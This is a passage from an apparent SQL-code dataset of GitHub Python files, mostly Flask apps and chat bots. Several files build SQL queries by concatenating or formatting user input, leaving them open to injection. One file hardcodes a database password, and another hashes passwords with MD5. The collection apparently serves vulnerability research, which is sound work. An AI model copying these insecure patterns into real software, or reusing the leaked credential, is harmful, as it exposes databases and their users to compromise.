getValues(protocole):\r\n    db=getConnexion()\r\n    sql = \"SELECT * FROM \"+protocole\r\n    db.cur.execute(sql)\r\n    res = db.cur.fetchall()\r\n    finalDict = dict()\r\n    for r in res:\r\n        dictValues = ast.literal_eval(r[3])\r\n        finalDict[r[2]] = dictValues['values']\r\n    return Response(flask.json.dumps(finalDict), mimetype='application/json')\r\n\r\n\r\ndef getParmeters():\r\n    data = flask.request.json['protocoleForm']\r\n    listKeys = list()\r\n    listValues = list()\r\n    for key, value in data.iteritems():\r\n        listKeys.append(key)\r\n        listValues.append(value)\r\n    return {'keys': listKeys, 'values': listValues}\r\n\r\n\r\n\r\n@addObs.route('/submit/', methods=['POST'])\r\ndef submitObs():\r\n    db = getConnexion()\r\n    if flask.request.method == 'POST':\r\n        observateur = flask.request.json['general']['observateur']\r\n        cd_nom = flask.request.json['general']['taxon']['cd_ref']\r\n        loc_exact = flask.request.json['general']['loc_exact']\r\n        code_maille = str()\r\n        loc = flask.request.json['general']['coord']\r\n        x = str(loc['lng'])\r\n        y = str(loc['lat'])\r\n        point = 'POINT('+x+' '+y+')'\r\n        code_maille = flask.request.json['general']['code_maille']\r\n       \r\n\r\n        date = flask.request.json['general']['date']\r\n        commentaire = flask.request.json['general']['commentaire']\r\n        comm_loc = flask.request.json['general']['comm_loc']\r\n        protocoleObject = flask.request.json['protocole']\r\n\r\n        fullTableName = protocoleObject['nom_schema']+\".\"+protocoleObject['nom_table']\r\n        protocoleName = protocoleObject['nom_table']\r\n        id_projet = protocoleObject['id_projet']\r\n\r\n\r\n        #prend le centroide de maille pour intersecter avec la foret et l'insee\r\n        centroid = None\r\n        if not loc_exact:\r\n            point = None\r\n            sql = \"SELECT ST_AsText(ST_Centroid(ST_TRANSFORM(geom, 4326))) FROM layers.maille_1_2 WHERE id_maille = %s \"\r\n            params = [code_maille]\r\n            db.cur.execute(sql, params)\r\n            res = db.cur.fetchone()\r\n            if res != None:\r\n                centroid = res[0]\r\n\r\n\r\n        #foret\r\n        sql_foret = \"\"\" SELECT ccod_frt FROM layers.perimetre_forets WHERE ST_INTERSECTS(geom,(ST_Transform(ST_GeomFromText(%s, 4326),%s)))\"\"\"\r\n        if loc_exact:\r\n            params = [point, config['MAP']['PROJECTION']]\r\n        else:\r\n            params = [centroid, config['MAP']['PROJECTION']]\r\n        db.cur.execute(sql_foret, params)\r\n        res = db.cur.fetchone()\r\n        ccod_frt = None \r\n        if res != None:\r\n            ccod_frt = res[0]\r\n\r\n        # #insee\r\n        sql_insee = \"\"\" SELECT code_insee FROM layers.commune WHERE ST_INTERSECTS(geom,(ST_Transform(ST_GeomFromText(%s, 4326),%s)))\"\"\"\r\n        if loc_exact:\r\n            params = [point, config['MAP']['PROJECTION']]\r\n        else:\r\n            params = [centroid, config['MAP']['PROJECTION']]\r\n        db.cur.execute(sql_insee, params)\r\n        res = db.cur.fetchone()\r\n        insee = None \r\n        if res != None:\r\n            insee = res[0]\r\n\r\n\r\n        #recupere l id_structure a partir de l'info stocker dans la session\r\n        id_structure = session['id_structure']\r\n        valide= False\r\n\r\n        generalValues = [id_projet,observateur, date, cd_nom, point, insee, commentaire, valide, ccod_frt, loc_exact, code_maille, id_structure, comm_loc]\r\n\r\n\r\n        ###protocole \r\n        stringInsert = \"INSERT INTO \"+fullTableName+\"(id_projet, observateur, date, cd_nom, geom_point, insee, commentaire, valide, ccod_frt, loc_exact, code_maille, id_structure, comm_loc\"\r\n        stringValues = \"\"\r\n        if loc_exact:\r\n            stringValues = \"VALUES (%s, %s, %s, %s,  ST_Transform(ST_PointFromText(%s, 4326),\"+str(config['MAP']['PROJECTION'])+\"), %s, %s, %s, %s, %s, %s, %s, %s\"\r\n        else:\r\n            stringValues = \"VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s\"\r\n        keys = getParmeters()['keys']\r\n        values = getParmeters()['values']\r\n        for k in keys:\r\n            stringInsert += \", \"+k\r\n            stringValues += \", %s\"\r\n        stringInsert+=\")\"\r\n        stringValues+=\")\"\r\n        for v in values:\r\n            generalValues.append(v)\r\n        params = generalValues\r\n        sql = stringInsert+stringValues\r\n\r\n        db.cur.execute(sql, params)\r\n        db.conn.commit()\r\n        db.closeAll()\r\n    return Response(flask.json.dumps('success'), mimetype='application/json')\r\n\r\n\r\n\r\n\r\n    ",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sycherng/fluffybot/blob/39aed8962a384bae11f49273aa74a3e0a8e51f18",
        "file_path": "/db.py",
        "source": "import psycopg2\n\n#---database table names\nuser_table = 'user_objects'\nrank_permit_table = 'rank_privileges'\n\ndef fetch(query):\n    conn = psycopg2.connect(\"dbname=fluffy_bot user=censored password=Laumau11p\")\n    cur = conn.cursor()\n    cur.execute(query)\n    result = cur.fetchall()\n    cur.close()\n    conn.close()\n    return result\n\ndef update(query):\n    conn = psycopg2.connect(\"dbname=fluffy_bot user=censored password=Laumau11p\")\n    cur = conn.cursor()\n    cur.execute(query)\n    conn.commit()\n    cur.close()\n    conn.close()\n\ndef check(id, attribute, clss):\n    try:\n        attribute_value = fetch(\"SELECT {} FROM {} WHERE id = '{}';\".format(attribute, clss, id))\n    except:\n        return None\n    else:\n        return attribute_value\n\ndef rank_check(id, function):\n    query = check(id, 'rank', user_table)\n    rank = query[0][0]\n    query2 = fetch(\"SELECT {} FROM {} WHERE FUNCTION = '{}';\".format(rank, rank_permit_table, function))\n    if query2[0][0] == True:\n        return True\n    return False\n\ndef isInt(ss):\n    \"\"\" Is the given string an integer? \"\"\"\n    try: int(ss)\n    except ValueError: return False\n    else: return True\n\ndef is_valid_id(ss):\n    '''verifies if id is likely a valid discord id'''\n    if type(ss) == type('') and len(ss) >= 15 and len(ss) <= 20 and isInt(ss):\n        return True\n    return False\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/sycherng/fluffybot/blob/39aed8962a384bae11f49273aa74a3e0a8e51f18",
        "file_path": "/user.py",
        "source": "import main\nimport db\n\nclass User:\n    def __init__(self, id, nickname, rank='member', balance=100, events_attd=0):\n        self.id = id\n        self.nickname = nickname\n        self.rank = rank\n        self.balance = balance\n        self.events_attd = events_attd\n\nasync def respond(bot, message):\n    await user_add(bot, message)\n\nasync def spawn_user(bot, message):\n    if not db.check(message.author.id, 'id', db.user_table):\n        db.update(\"INSERT INTO {} (id, nickname) VALUES ('{}', '{}');\".format(db.user_table, message.author.id, message.author))\n\nasync def user_add(bot, message):\n    #--- call: user add <id> <nickname>\n    if message.content.startswith('user add '):\n        msg = message.content.split()[2:]\n        if db.rank_check(message.author.id, 'user add') and len(msg) == 2 and db.is_valid_id(msg[0]):\n            db.update(\"INSERT INTO {} (id, nickname, rank) VALUES ('{}', '{}', 'member');\".format(db.user_table, msg[0], msg[1]))\n\n    \n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ChristianAgha/holbertonschool-higher_level_programming/blob/7c9ac207c3a318a79ddb18615a484b3e1bd5b576",
        "file_path": "/0x0F-python-object_relational_mapping/5-filter_cities.py",
        "source": "#!/usr/bin/python3\n\"\"\"\ntakes in the name of a state as an argument and lists all cities of that state\n\"\"\"\nimport MySQLdb\nfrom sys import argv\n\nif __name__ == \"__main__\":\n\n    city_list = []\n    db = MySQLdb.Connect(host=\"localhost\", port=3306, user=argv[1],\n                         passwd=argv[2], db=argv[3])\n\n    cur = db.cursor()\n    cur.execute(\"\"\"\n    SELECT cities.id, cities.name, states.name\n    FROM cities\n    JOIN states ON cities.state_id=states.id\n    ORDER BY cities.id ASC\"\"\")\n\n    cities = cur.fetchall()\n    for city in cities:\n        if city[2] == argv[4]:\n            city_list.append(city[1])\n\n    print(\", \".join(city_list))\n\n    cur.close()\n    db.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Nithanaroy/astronomy_visualizations/blob/b1a5898c2a365327466b90e65dd9493abca208eb",
        "file_path": "/App/Server.py",
        "source": "#!/bin/env python\n# encoding: utf-8\n\nimport os\nimport time\nimport logging\nfrom flask import jsonify\nfrom flask import Flask, request\nfrom flask import render_template\nfrom flask import send_from_directory\n\nimport Importer\nfrom DataSource.MySQLDataSource import MySQL\nimport Config\nfrom Config import logger\n\napp = Flask(__name__)\n\nLOG_DIR = os.environ['LOGFILES_PATH'] if 'LOGFILES_PATH' in os.environ else './logs/'\nUPLOADS_DIR = os.environ['DATAFILES_PATH'] if 'DATAFILES_PATH' in os.environ else './uploads/'\nDATABASE = os.environ['DB_NAME'] if 'DB_NAME' in os.environ else 'astronomy'\n\n\n# HTML Services\n@app.route('/')\ndef index():\n    # return render_template('import.html')\n    return explore()\n\n\n@app.route('/import')\ndef import_data():\n    return render_template('import.html')\n\n\n@app.route('/visualize')\ndef visualize():\n    return render_template('visualization.html')\n\n\n@app.route('/explore')\ndef explore():\n    return render_template('explore.html')\n\n\n@app.route('/log/<filename>')\ndef send_logfile(filename):\n    return send_from_directory(LOG_DIR, filename)\n\n\n@app.route('/partials/<filename>')\ndef send_partial(filename):\n    return render_template('partials/%s' % (filename,))\n\n\n# Services\n@app.route('/upload', methods=['POST'])\ndef upload():\n    datafile = request.files['file']\n    c = MySQL.get_connection(DATABASE)\n    if datafile:\n        try:\n            logfile = os.path.splitext(datafile.filename)[0] + str(\n                int(time.time())) + '.log'  # given name + current timestamp\n            f = logging.FileHandler(os.path.join(LOG_DIR, logfile), 'w')\n            Config.setup_logging(f)\n\n            filepath = os.path.join(UPLOADS_DIR, datafile.filename)\n            datafile.save(filepath)  # to file system\n            Importer.run(filepath, c)\n\n            logger.removeHandler(f)\n            f.close()\n            return jsonify({\"name\": datafile.filename, 'log': logfile})\n        finally:\n            c.close()\n\n\n@app.route('/stars/<int:page>/<int:limit>')\ndef stars(page, limit):\n    try:\n        query = \"SELECT * FROM star LIMIT %s OFFSET %s\"\n        db_res = MySQL.execute(DATABASE, query, [limit, page * limit])\n        resp = [dict(zip(db_res['columns'], [str(t) if type(t) is bytearray else t for t in row])) for row in\n                db_res['rows']]\n        return jsonify({'stars': resp, \"status\": {\"message\": \"Fetched %s stars\" % (len(resp),)}})\n    except Exception as err:\n        logger.exception(err)\n        return jsonify({\"status\": {\"message\": \"Something went wrong\"}}), 500\n\n\n@app.route('/star/<hip>/elements')\ndef elements_of_star(hip):\n    try:\n        query = \"SELECT DISTINCT element FROM composition WHERE hip = %s\"\n        res = map(lambda e: e[0], MySQL.execute(DATABASE, query, [hip])['rows'])\n        return jsonify({'elements': res})\n    except Exception as err:\n        logger.exception(err)\n        return jsonify({\"status\": {\"message\": \"Something went wrong\"}}), 500\n\n\n@app.route('/star/<hip>/compositions')\ndef compositions_of_star(hip):\n    try:\n        elements = request.args.getlist('elements')\n        in_clause = ','.join(['%s'] * len(elements))\n        query = \"\"\"SELECT element, AVG(value)\n                    FROM composition WHERE hip = %s AND element IN ({})\n                    GROUP BY element;\"\"\".format(in_clause)\n        res = {}\n        for k, v in MySQL.execute(DATABASE, query, [hip] + elements)['rows']:\n            res[k] = v\n        return jsonify(res)\n    except Exception as err:\n        logger.exception(err)\n        return jsonify({\"status\": {\"message\": \"Something went wrong\"}}), 500\n\n\ndef main():\n    app.run(debug=True, host='0.0.0.0')\n\n\nif __name__ == '__main__':\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jia1/socmentation-bot/blob/9d4b3c13b0ffa546632b8fa96420a7e58c17944c",
        "file_path": "/bot.py",
        "source": "# Sources:\n# Building a Chatbot using Telegram and Python (Part 1) by Gareth Dwyer\n\nimport json, logging, requests, time, urllib\nfrom bisect import bisect\nfrom db_helper import DBHelper\n\n# See https://docs.python.org/3/library/logging.html#logging.basicConfig for basicConfig options and\n# https://docs.python.org/3/library/logging.html#logrecord-attributes for format options\nlogging.basicConfig(filename = 'bot.log', format = \"%(asctime)s %(levelname)s %(message)s\", level = logging.INFO)\n\ndb = DBHelper()\n\nwith open('token.txt', 'r') as f:\n    bot_token = f.readline().strip()\n\nbase_url = 'https://api.telegram.org/bot{}'.format(bot_token)\n\nreplies = {}\nwith open('replies.txt', 'r') as m:\n    num_lines, command = m.readline().strip().split(' ')\n    num_lines = int(num_lines)\n    while num_lines:\n        replies[command] = []\n        for i in range(num_lines):\n            replies[command].append(m.readline().strip())\n        num_lines, command = m.readline().strip().split(' ')\n        num_lines = int(num_lines)\nlogging.info(\"Reply messages loaded into memory\")\n\nblacklisted = {}\nwith open('blacklisted.txt', 'r') as f:\n    num_blacklisted = int(f.readline().strip())\n    for n in range(num_blacklisted):\n        offender = int(f.readline().strip())\n        if offender in blacklisted:\n            blacklisted[offender] += 1\n        else:\n            blacklisted[offender] = 1\nlogging.info(\"Blacklisted senders loaded into memory\")\n\nreporting = {}\nreporters_dict = {}\nreporters_list = []\nlast_submitted_times = []\nlogging.info(\"Data structures loaded into memory\")\n\n# TODO: Remove idle reporters\ntimeout_oth = 300\ntimeout_ask = 180\nlogging.info(\"Response timeouts loaded into memory\")\n\nmax_ans_len = 70\nnum_questions = len(replies['questions'])\nreport_cooldown = 1800\nlogging.info(\"Other variables loaded into memory\")\n\ndef get_json_from_url(url):\n    response = requests.get(url)\n    decoded_content = response.content.decode('utf-8')\n    logging.info(\"GET %s responded with %s\", url, decoded_content)\n    return json.loads(decoded_content)\n\ndef get_updates(timeout, offset = None):\n    url = '{}/getUpdates?timeout={}'.format(base_url, timeout)\n    if offset:\n        url += '&offset={}'.format(offset)\n    return get_json_from_url(url)\n\ndef get_latest_update_id(updates):\n    update_ids = []\n    for update in updates['result']:\n        update_ids.append(int(update['update_id']))\n    latest_update_id = max(update_ids)\n    logging.info(\"get_latest_update_id: Latest update ID is %d of %s\", latest_update_id, update_ids)\n    return latest_update_id\n\ndef get_latest_chat_id_and_text(updates):\n    text = updates['result'][-1]['message']['text'].encode('utf-8')\n    chat_id = updates['result'][-1]['message']['chat']['id']\n    logging.info(\"get_latest_chat_id_and_text: Latest message is %s from chat %d\", text, chat_id)\n    return (text, chat_id)\n\ndef send_message(text, chat_id):\n    text = urllib.parse.quote_plus(text)\n    url = '{}/sendMessage?text={}&chat_id={}&parse_mode=Markdown'.format(base_url, text, chat_id)\n    logging.info(\"send_message: Sending %s to chat %d\", text, chat_id)\n    requests.get(url)\n\ndef handle_updates(updates, latest_update_id):\n    for update in updates['result']:\n        try:\n            text = update['message']['text']\n            chat = update['message']['chat']['id']\n            sender = update['message']['from']['id']\n            is_ascii = all(ord(char) < 128 for char in text)\n            logging.info(\"handle_updates: Received %s from %d\", text.encode('utf-8'), sender)\n\n            if not is_ascii:\n                send_message(replies['invalid'][0], chat)\n                continue\n\n            if sender in reporting:\n                if validate_answer(text):\n                    reporting[sender].append(text)\n                    reporting[sender][0] += 1\n                    if reporting[sender][0] >= num_questions:\n                        answers = reporting[sender][1:]\n                        inserted, violations = db.insert(answers)\n                        reporting.pop(sender)\n                        if inserted:\n                            logging.info(\"handle_updates: Insert %s returns %r\", str(answers), inserted)\n                            send_message(replies['thanks'][0], chat)\n                            last_submitted = int(time.time())\n                            reporters_dict[sender] = last_submitted\n                            reporters_list.append(sender)\n                            last_submitted_times.append(last_submitted)\n                        else:\n                            send_message(replies['invalid'][0], chat)\n                    else:\n                        send_message(replies['questions'][reporting[sender][0]], chat)\n                else:\n                    send_message(replies['invalid'][0], chat)\n                    send_message(replies['questions'][reporting[sender][0]], chat)\n            elif text == '/help':\n                send_message(replies[text][0], chat)\n            elif text == '/start':\n                send_message('\\n'.join(replies[text]), chat)\n            elif text == '/report':\n                if sender in blacklisted:\n                    send_message(replies['blacklisted'][0], chat)\n                elif is_recent_reporter(sender):\n                    logging.info(\"handle_updates: %d not in blacklist\", sender)\n                    send_message(replies['cooldown'][0], chat)\n                else:\n                    send_message(replies[text][0], chat)\n                    reporting[sender] = [0]\n                    send_message(replies['questions'][0], chat)\n            elif text == '/view':\n                send_message(replies[text][0] + db.select_recent_pretty(), chat)\n            else:\n                send_message(replies['dk'][0], chat)\n        except KeyError:\n            pass\n\ndef is_recent_reporter(sender_id):\n    global reporters_dict, reporters_list, last_submitted_times\n    least_recent_index = bisect(last_submitted_times, int(time.time()) - report_cooldown)\n    for expired_reporter in range(least_recent_index):\n        reporters_dict.pop(expired_reporter)\n    last_submitted_times = last_submitted_times[least_recent_index:]\n    reporters_list = reporters_list[least_recent_index:]\n    is_recent = sender_id in reporters_dict\n    logging.info(\"is_recent_reporter: %d returns %r\", sender_id, is_recent)\n    return is_recent\n\ndef validate_answer(ans):\n    too_long = len(ans) > max_ans_len\n    logging.info(\"validate_answer: %s returns %r\", str(ans), not too_long)\n    return not too_long\n\ndef main():\n    db.create_table()\n    latest_update_id = None\n    while True:\n        updates = get_updates(timeout_oth, latest_update_id)\n        if updates['result']:\n            latest_update_id = get_latest_update_id(updates) + 1\n            handle_updates(updates, latest_update_id)\n        time.sleep(1)\n\nif __name__ == '__main__':\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/jia1/socmentation-bot/blob/9d4b3c13b0ffa546632b8fa96420a7e58c17944c",
        "file_path": "/db_helper.py",
        "source": "# Sources:\n# Building a Chatbot using Telegram and Python (Part 2) by Gareth Dwyer\n\nfrom time import strftime, time\nfrom pretty_date import prettify_date\nimport sqlite3\n\ndb_name = \"robodb.sqlite\"\ntb_name = \"robotb\"\nmapping = \"timestamp INTEGER, name TEXT, location TEXT, description TEXT\"\ncolumns = \"timestamp, name, location, description\"\none_week = 604800    # 1 week\none_year = 31540000  # 1 year\nmax_data_length = 70 # 70 characters\n\n# Question mark style does not work here for some unknown reason\n# This way of string formatting may be vulnerable to SQL injection\n\nclass DBHelper:\n    def __init__(self):\n        self.db_name = db_name\n        self.connection = sqlite3.connect(self.db_name)\n\n    def create_table(self):\n        stmt = \"CREATE TABLE IF NOT EXISTS {} ({})\".format(tb_name, mapping)\n        self.connection.execute(stmt)\n        self.connection.commit()\n\n    def insert(self, input_row):\n        is_valid, violations = self.validate_row(input_row)\n        if is_valid:\n            name, location, description = input_row\n            date = int(time())\n            args = (date, name, location, description)\n            stmt = \"INSERT INTO {} ({}) VALUES {}\".format(tb_name, columns, str(args))\n            self.connection.execute(stmt)\n            self.connection.commit()\n        return (is_valid, violations)\n\n    def select_recent(self):\n        last = int(time()) - one_week\n        stmt = \"SELECT {} FROM {} WHERE timestamp >= {} ORDER BY timestamp DESC\".format(\n            columns, tb_name, str(last))\n        rows = self.connection.execute(stmt)\n        return rows\n\n    def delete_old(self):\n        last = int(time()) - one_year\n        stmt = \"DELETE FROM {} WHERE timestamp >= {}\".format(tb_name, str(last))\n        self.connection.execute(stmt)\n        self.connection.commit()\n\n    def select_recent_pretty(self):\n        return self.prettify_rows(self.select_recent())\n\n    def prettify_rows(self, rows):\n        str_builder = ['\\n']\n        for row in rows:\n            str_builder.append(\"When: {}\".format(prettify_date(row[0])))\n            str_builder.extend(row[1:])\n            str_builder.append('')\n        return '\\n'.join(str_builder)\n\n    def validate_row(self, input_row):\n        length_exceeded = [data for data in input_row if len(data) > max_data_length]\n        if length_exceeded:\n            return (False, length_exceeded)\n        return (True, [])\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/dcoles/ivle/blob/c3b759a5ef1adc8154a05049cb29cdac5fa09057",
        "file_path": "/lib/common/db.py",
        "source": "# IVLE - Informatics Virtual Learning Environment\n# Copyright (C) 2007-2008 The University of Melbourne\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation; either version 2 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA\n\n# Module: Database\n# Author: Matt Giuca\n# Date:   15/2/2008\n\n# Code to talk to the PostgreSQL database.\n# (This is the Data Access Layer).\n# All DB code should be in this module to ensure portability if we want to\n# change the DB implementation.\n# This means no SQL strings should be outside of this module. Add functions\n# here to perform the activities needed, and place the SQL code for those\n# activities within.\n\n# CAUTION to editors of this module.\n# All string inputs must be sanitized by calling _escape before being\n# formatted into an SQL query string.\n\nimport pg\nimport conf\nimport md5\nimport copy\nimport time\n\nfrom common import (caps, user)\n\nTIMESTAMP_FORMAT = '%Y-%m-%d %H:%M:%S'\n\ndef _escape(val):\n    \"\"\"Wrapper around pg.escape_string. Prepares the Python value for use in\n    SQL. Returns a string, which may be safely placed verbatim into an SQL\n    query.\n    Handles the following types:\n    * str: Escapes the string, and also quotes it.\n    * int/long/float: Just converts to an unquoted string.\n    * bool: Returns as \"TRUE\" or \"FALSE\", unquoted.\n    * NoneType: Returns \"NULL\", unquoted.\n    * common.caps.Role: Returns the role as a quoted, lowercase string.\n    Raises a DBException if val has an unsupported type.\n    \"\"\"\n    # \"E'\" is postgres's way of making \"escape\" strings.\n    # Such strings allow backslashes to escape things. Since escape_string\n    # converts a single backslash into two backslashes, it needs to be fed\n    # into E mode.\n    # Ref: http://www.postgresql.org/docs/8.2/static/sql-syntax-lexical.html\n    # WARNING: PostgreSQL-specific code\n    if val is None:\n        return \"NULL\"\n    elif isinstance(val, str):\n        return \"E'\" + pg.escape_string(val) + \"'\"\n    elif isinstance(val, bool):\n        return \"TRUE\" if val else \"FALSE\"\n    elif isinstance(val, int) or isinstance(val, long) \\\n        or isinstance(val, float):\n        return str(val)\n    elif isinstance(val, caps.Role):\n        return _escape(str(val))\n    elif isinstance(val, time.struct_time):\n        return _escape(time.strftime(TIMESTAMP_FORMAT, val))\n    else:\n        raise DBException(\"Attempt to insert an unsupported type \"\n            \"into the database\")\n\ndef _passhash(password):\n    return md5.md5(password).hexdigest()\n\nclass DBException(Exception):\n    \"\"\"A DBException is for bad conditions in the database or bad input to\n    these methods. If Postgres throws an exception it does not get rebadged.\n    This is only for additional exceptions.\"\"\"\n    pass\n\nclass DB:\n    \"\"\"An IVLE database object. This object provides an interface to\n    interacting with the IVLE database without using any external SQL.\n\n    Most methods of this class have an optional dry argument. If true, they\n    will return the SQL query string and NOT actually execute it. (For\n    debugging purposes).\n\n    Methods may throw db.DBException, or any of the pg exceptions as well.\n    (In general, be prepared to catch exceptions!)\n    \"\"\"\n    def __init__(self):\n        \"\"\"Connects to the database and creates a DB object.\n        Takes no parameters - gets all the DB info from the configuration.\"\"\"\n        self.open = False\n        self.db = pg.connect(dbname=conf.db_dbname, host=conf.db_host,\n                port=conf.db_port, user=conf.db_user, passwd=conf.db_password)\n        self.open = True\n\n    def __del__(self):\n        if self.open:\n            self.db.close()\n\n    # GENERIC DB FUNCTIONS #\n\n    @staticmethod\n    def check_dict(dict, tablefields, disallowed=frozenset([]), must=False):\n        \"\"\"Checks that a dict does not contain keys that are not fields\n        of the specified table.\n        dict: A mapping from string keys to values; the keys are checked to\n            see that they correspond to login table fields.\n        tablefields: Collection of strings for field names in the table.\n            Only these fields will be allowed.\n        disallowed: Optional collection of strings for field names that are\n            not allowed.\n        must: If True, the dict MUST contain all fields in tablefields.\n            If False, it may contain any subset of the fields.\n        Returns True if the dict is valid, False otherwise.\n        \"\"\"\n        allowed = frozenset(tablefields) - frozenset(disallowed)\n        dictkeys = frozenset(dict.keys())\n        if must:\n            return allowed == dictkeys\n        else:\n            return allowed.issuperset(dictkeys)\n\n    def insert(self, dict, tablename, tablefields, disallowed=frozenset([]),\n        dry=False):\n        \"\"\"Inserts a new row in a table, using data from a supplied\n        dictionary (which will be checked by check_dict).\n        dict: Dictionary mapping column names to values. The values may be\n            any of the following types:\n            str, int, long, float, NoneType.\n        tablename: String, name of the table to insert into. Will NOT be\n            escaped - must be a valid identifier.\n        tablefields, disallowed: see check_dict.\n        dry: Returns the SQL query as a string, and does not execute it.\n        Raises a DBException if the dictionary contains invalid fields.\n        \"\"\"\n        if not DB.check_dict(dict, tablefields, disallowed):\n            extras = set(dict.keys()) - tablefields\n            raise DBException(\"Supplied dictionary contains invalid fields. (%s)\" % (repr(extras)))\n        # Build two lists concurrently: field names and values, as SQL strings\n        fieldnames = []\n        values = []\n        for k,v in dict.items():\n            fieldnames.append(k)\n            values.append(_escape(v))\n        if len(fieldnames) == 0: return\n        fieldnames = ', '.join(fieldnames)\n        values = ', '.join(values)\n        query = (\"INSERT INTO %s (%s) VALUES (%s);\"\n            % (tablename, fieldnames, values))\n        if dry: return query\n        self.db.query(query)\n\n    def update(self, primarydict, updatedict, tablename, tablefields,\n        primary_keys, disallowed_update=frozenset([]), dry=False):\n        \"\"\"Updates a row in a table, matching against primarydict to find the\n        row, and using the data in updatedict (which will be checked by\n        check_dict).\n        primarydict: Dict mapping column names to values. The keys should be\n            the table's primary key. Only rows which match this dict's values\n            will be updated.\n        updatedict: Dict mapping column names to values. The columns will be\n            updated with the given values for the matched rows.\n        tablename, tablefields, disallowed_update: See insert.\n        primary_keys: Collection of strings which together form the primary\n            key for this table. primarydict must contain all of these as keys,\n            and only these keys.\n        \"\"\"\n        if (not (DB.check_dict(primarydict, primary_keys, must=True)\n            and DB.check_dict(updatedict, tablefields, disallowed_update))):\n            raise DBException(\"Supplied dictionary contains invalid or missing fields (1).\")\n        # Make a list of SQL fragments of the form \"field = 'new value'\"\n        # These fragments are ALREADY-ESCAPED\n        setlist = []\n        for k,v in updatedict.items():\n            setlist.append(\"%s = %s\" % (k, _escape(v)))\n        wherelist = []\n        for k,v in primarydict.items():\n            wherelist.append(\"%s = %s\" % (k, _escape(v)))\n        if len(setlist) == 0 or len(wherelist) == 0:\n            return\n        # Join the fragments into a comma-separated string\n        setstring = ', '.join(setlist)\n        wherestring = ' AND '.join(wherelist)\n        # Build the whole query as an UPDATE statement\n        query = (\"UPDATE %s SET %s WHERE %s;\"\n            % (tablename, setstring, wherestring))\n        if dry: return query\n        self.db.query(query)\n\n    def delete(self, primarydict, tablename, primary_keys, dry=False):\n        \"\"\"Deletes a row in the table, matching against primarydict to find\n        the row.\n        primarydict, tablename, primary_keys: See update.\n        \"\"\"\n        if not DB.check_dict(primarydict, primary_keys, must=True):\n            raise DBException(\"Supplied dictionary contains invalid or missing fields (2).\")\n        wherelist = []\n        for k,v in primarydict.items():\n            wherelist.append(\"%s = %s\" % (k, _escape(v)))\n        if len(wherelist) == 0:\n            return\n        wherestring = ' AND '.join(wherelist)\n        query = (\"DELETE FROM %s WHERE %s;\" % (tablename, wherestring))\n        if dry: return query\n        self.db.query(query)\n\n    def get_single(self, primarydict, tablename, getfields, primary_keys,\n        error_notfound=\"No rows found\", dry=False):\n        \"\"\"Retrieves a single row from a table, returning it as a dictionary\n        mapping field names to values. Matches against primarydict to find the\n        row.\n        primarydict, tablename, primary_keys: See update/delete.\n        getfields: Collection of strings; the field names which will be\n            returned as keys in the dictionary.\n        error_notfound: Error message if 0 rows match.\n        Raises a DBException if 0 rows match, with error_notfound as the msg.\n        Raises an AssertError if >1 rows match (this should not happen if\n            primary_keys is indeed the primary key).\n        \"\"\"\n        if not DB.check_dict(primarydict, primary_keys, must=True):\n            raise DBException(\"Supplied dictionary contains invalid or missing fields (3).\")\n        wherelist = []\n        for k,v in primarydict.items():\n            wherelist.append(\"%s = %s\" % (k, _escape(v)))\n        if len(getfields) == 0 or len(wherelist) == 0:\n            return\n        # Join the fragments into a comma-separated string\n        getstring = ', '.join(getfields)\n        wherestring = ' AND '.join(wherelist)\n        # Build the whole query as an SELECT statement\n        query = (\"SELECT %s FROM %s WHERE %s;\"\n            % (getstring, tablename, wherestring))\n        if dry: return query\n        result = self.db.query(query)\n        # Expecting exactly one\n        if result.ntuples() != 1:\n            # It should not be possible for ntuples to be greater than 1\n            assert (result.ntuples() < 1)\n            raise DBException(error_notfound)\n        # Return as a dictionary\n        return result.dictresult()[0]\n\n    def get_all(self, tablename, getfields, dry=False):\n        \"\"\"Retrieves all rows from a table, returning it as a list of\n        dictionaries mapping field names to values.\n        tablename, getfields: See get_single.\n        \"\"\"\n        if len(getfields) == 0:\n            return\n        getstring = ', '.join(getfields)\n        query = (\"SELECT %s FROM %s;\" % (getstring, tablename))\n        if dry: return query\n        return self.db.query(query).dictresult()\n\n    def start_transaction(self, dry=False):\n        \"\"\"Starts a DB transaction.\n        Will not commit any changes until self.commit() is called.\n        \"\"\"\n        query = \"START TRANSACTION;\"\n        if dry: return query\n        self.db.query(query)\n\n    def commit(self, dry=False):\n        \"\"\"Commits (ends) a DB transaction.\n        Commits all changes since the call to start_transaction.\n        \"\"\"\n        query = \"COMMIT;\"\n        if dry: return query\n        self.db.query(query)\n\n    def rollback(self, dry=False):\n        \"\"\"Rolls back (ends) a DB transaction, undoing all changes since the\n        call to start_transaction.\n        \"\"\"\n        query = \"ROLLBACK;\"\n        if dry: return query\n        self.db.query(query)\n\n    # USER MANAGEMENT FUNCTIONS #\n\n    login_primary = frozenset([\"login\"])\n    login_fields_list = [\n        \"login\", \"passhash\", \"state\", \"unixid\", \"email\", \"nick\", \"fullname\",\n        \"rolenm\", \"studentid\", \"acct_exp\", \"pass_exp\", \"last_login\", \"svn_pass\"\n    ]\n    login_fields = frozenset(login_fields_list)\n\n    def create_user(self, user_obj=None, dry=False, **kwargs):\n        \"\"\"Creates a user login entry in the database.\n        Two ways to call this - passing a user object, or passing\n        all fields as separate arguments.\n\n        Either pass a \"user_obj\" as the first argument (in which case other\n        fields will be ignored), or pass all fields as arguments.\n\n        All user fields are to be passed as args. The argument names\n        are the field names of the \"login\" table of the DB schema.\n        However, instead of supplying a \"passhash\", you must supply a\n        \"password\" argument, which will be hashed 